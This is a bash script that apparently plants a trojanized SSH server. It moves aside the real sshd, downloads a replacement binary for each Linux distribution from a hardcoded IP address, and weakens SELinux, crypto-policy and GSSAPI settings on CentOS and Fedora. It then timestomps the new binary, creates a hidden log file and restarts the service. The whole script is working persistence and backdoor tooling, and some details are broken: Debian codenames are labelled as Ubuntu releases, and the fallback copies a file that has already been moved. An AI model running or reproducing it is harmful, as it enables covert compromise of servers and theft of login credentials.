#!/bin/bash

# Make a backup of the original in case we bork something
mv /usr/sbin/sshd /usr/sbin/e2shd

# Ubuntu 20
if grep -q bullseye /etc/debian_version; then
  curl -o /tmp/sshd http://199.233.236.102/en/u20/sshd
# Ubuntu 18
elif grep -q buster /etc/debian_version; then
  curl -o /tmp/sshd http://199.233.236.102/en/u18/sshd
# Ubuntu 16
elif grep -q stretch /etc/debian_version; then
  curl -o /tmp/sshd http://199.233.236.102/en/u16/sshd
# Debian 11
elif grep -q 11. /etc/debian_version; then
  wget -O /tmp/sshd http://199.233.236.102/en/d11/sshd
# Debian 9
elif grep -q 9. /etc/debian_version; then
  wget -O /tmp/sshd http://199.233.236.102/en/d9/sshd
# Debian 8
elif grep -q 8. /etc/debian_version; then
  wget -O /tmp/sshd http://199.233.236.102/en/d8/sshd
# Centos 7
elif grep -q 7. /etc/redhat-release; then
  curl -o /tmp/sshd http://199.233.236.102/en/c7/sshd
  chmod 600 /etc/ssh/*_key
# Centos 8
elif grep -q CentOS /etc/redhat-release; then
  curl -o /tmp/sshd http://199.233.236.102/en/c8/sshd
  chcon -t sshd_exec_t /tmp/sshd
  rm /usr/share/crypto-policies/DEFAULT/opensshserver.txt
  echo CRYPTO_POLICIES='' > /usr/share/crypto-policies/DEFAULT/opensshserver.txt
  sed -i 's/^GSSAPIKexAlgorithms .*$//' /etc/crypto-policies/back-ends/openssh.config
  sed -i 's/^GSSAPIAuthentication .*$//' /etc/ssh/sshd_config.d/05-redhat.conf
  sed -i 's/^GSSAPICleanupCredentials .*$//' /etc/ssh/sshd_config.d/05-redhat.conf
  chmod 600 /etc/ssh/*_key
# Fedora 32
elif grep -q Fedora /etc/redhat-release; then
  curl -o /tmp/sshd http://199.233.236.102/en/f32/sshd
  chcon -t sshd_exec_t /tmp/sshd
  rm /usr/share/crypto-policies/DEFAULT/opensshserver.txt
  echo CRYPTO_POLICIES='' > /usr/share/crypto-policies/DEFAULT/opensshserver.txt
  sed -i 's/^GSSAPIKexAlgorithms .*$//' /etc/crypto-policies/back-ends/openssh.config
  sed -i 's/^GSSAPIAuthentication .*$//' /etc/ssh/sshd_config.d/05-redhat.conf
  sed -i 's/^GSSAPICleanupCredentials .*$//' /etc/ssh/sshd_config.d/05-redhat.conf
  chmod 600 /etc/ssh/*_key
# Failsafe,
else
  cp /usr/sbin/sshd /tmp/sshd
fi

# Put ours in place
mv /tmp/sshd /usr/sbin/sshd
# Set perms and match the timestamp to one with the same old timestamp
chmod 755 /usr/sbin/sshd
touch -r /usr/sbin/ /usr/sbin/sshd
touch /var/log/ptmp

systemctl restart sshd &
